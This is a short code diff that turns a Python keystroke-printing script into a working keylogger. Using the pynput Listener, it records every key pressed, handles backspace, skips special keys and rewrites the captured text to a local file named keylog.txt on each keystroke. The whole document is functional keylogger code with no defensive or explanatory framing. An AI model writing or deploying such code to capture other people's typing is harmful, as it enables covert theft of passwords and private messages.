@@ -1,6 +1,10 @@
-from pynput.keyboard import Key, Listener
+from pynput.keyboard import Listener
+
+text = ""
 
 def show(key):
+
+    global text
 
     cleaned_key = str(key).strip("'")
     if cleaned_key == "Key.space":
@@ -10,10 +14,16 @@ def show(key):
     elif cleaned_key == "Key.tab":
         cleaned_key = "\t"
     elif cleaned_key == "Key.backspace":
-        cleaned_key = ''
+        text = text[:-1]
+        cleaned_key = ""
+    elif cleaned_key.split(".")[0] == "Key":
+        cleaned_key = ""
 
+    text += cleaned_key
 
-    print(cleaned_key, end='')
+    with open("keylog.txt", "w") as file:
+        file.write(text)
+
 
 with Listener(on_press = show) as listener:
     listener.join()
